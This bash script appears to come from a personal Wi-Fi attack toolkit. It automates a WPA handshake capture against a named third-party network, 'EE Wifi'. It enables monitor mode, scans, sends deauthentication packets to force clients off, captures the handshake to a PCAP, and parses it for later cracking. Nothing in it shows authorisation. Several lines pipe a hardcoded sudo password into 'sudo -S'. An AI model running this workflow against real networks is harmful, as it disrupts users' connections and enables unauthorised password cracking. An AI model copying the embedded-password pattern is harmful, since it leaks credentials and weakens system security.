#!/bin/bash
#
# Test PCAP Capture for EE Wifi
# This script demonstrates the complete capture workflow
#

set -e

INTERFACE="wlp0s20f3"
MON_INTERFACE="${INTERFACE}mon"
TARGET_SSID="EE Wifi"
CAPTURE_DURATION=60
DEAUTH_COUNT=5

echo "[*] Testing PCAP capture for: $TARGET_SSID"
echo "[*] Interface: $INTERFACE"
echo "[*] Monitor interface: $MON_INTERFACE"
echo ""

# Activate venv
cd /home/john/DSMILSystem/tools/WIFUCKER
source venv/bin/activate
export PYTHONPATH=/home/john/DSMILSystem/tools/WIFUCKER:$PYTHONPATH

# Step 1: Ensure monitor mode is enabled
echo "[*] Step 1: Ensuring monitor mode is enabled..."
echo '1786' | sudo -S env PYTHONPATH=$PYTHONPATH /home/john/DSMILSystem/tools/WIFUCKER/venv/bin/python3 scripts/wifi_cli.py monitor enable "$INTERFACE" 2>&1 | grep -E "\[|\+|Monitor" || true
echo ""

# Step 2: Scan for networks
echo "[*] Step 2: Scanning for networks (looking for $TARGET_SSID)..."
SCAN_OUTPUT=$(echo '1786' | sudo -S env PYTHONPATH=$PYTHONPATH /home/john/DSMILSystem/tools/WIFUCKER/venv/bin/python3 scripts/wifi_cli.py scan "$MON_INTERFACE" --duration 15 --json 2>&1 | grep -A 1000 '"data"' | head -200)

# Check if EE Wifi is found
if echo "$SCAN_OUTPUT" | grep -qi "EE"; then
    echo "[+] Found EE network in scan!"
    echo "$SCAN_OUTPUT" | python3 -m json.tool 2>/dev/null | grep -A 10 -i "EE" || echo "$SCAN_OUTPUT"
else
    echo "[-] EE Wifi not found in scan. Available networks:"
    echo "$SCAN_OUTPUT" | python3 -m json.tool 2>/dev/null | grep -E "essid|bssid" | head -20 || echo "No networks found"
fi
echo ""

# Step 3: Attempt capture
echo "[*] Step 3: Attempting to capture handshake for $TARGET_SSID..."
echo "[*] This will run for $CAPTURE_DURATION seconds with $DEAUTH_COUNT deauth packets"
echo ""

CAPTURE_OUTPUT=$(echo '1786' | sudo -S env PYTHONPATH=$PYTHONPATH /home/john/DSMILSystem/tools/WIFUCKER/venv/bin/python3 scripts/wifi_cli.py capture "$MON_INTERFACE" \
    --target-ssid "$TARGET_SSID" \
    --capture-duration "$CAPTURE_DURATION" \
    --deauth-count "$DEAUTH_COUNT" \
    --json \
    --progress-file /tmp/ee_capture_progress.json 2>&1)

echo "$CAPTURE_OUTPUT" | tail -50

# Check if capture was successful
if echo "$CAPTURE_OUTPUT" | grep -q '"success": true'; then
    PCAP_FILE=$(echo "$CAPTURE_OUTPUT" | python3 -c "import sys, json; d=json.load(sys.stdin); print(d.get('data',{}).get('pcap_file',''))" 2>/dev/null || echo "")
    
    if [ -n "$PCAP_FILE" ] && [ -f "$PCAP_FILE" ]; then
        echo ""
        echo "[+] Capture successful!"
        echo "[+] PCAP file: $PCAP_FILE"
        echo ""
        
        # Step 4: Parse the captured PCAP
        echo "[*] Step 4: Parsing captured PCAP..."
        PARSE_OUTPUT=$(env PYTHONPATH=$PYTHONPATH /home/john/DSMILSystem/tools/WIFUCKER/venv/bin/python3 scripts/wifi_cli.py parse "$PCAP_FILE" --json 2>&1)
        
        echo "$PARSE_OUTPUT" | python3 -m json.tool 2>/dev/null | head -50 || echo "$PARSE_OUTPUT"
        
        echo ""
        echo "[+] Test complete! PCAP file saved at: $PCAP_FILE"
    else
        echo "[-] Capture reported success but PCAP file not found"
    fi
else
    echo ""
    echo "[-] Capture failed. This is expected if:"
    echo "    1. EE Wifi network is not in range"
    echo "    2. Network has no active clients"
    echo "    3. Network is not broadcasting"
    echo ""
    echo "[*] To test with a different network, modify TARGET_SSID in this script"
fi

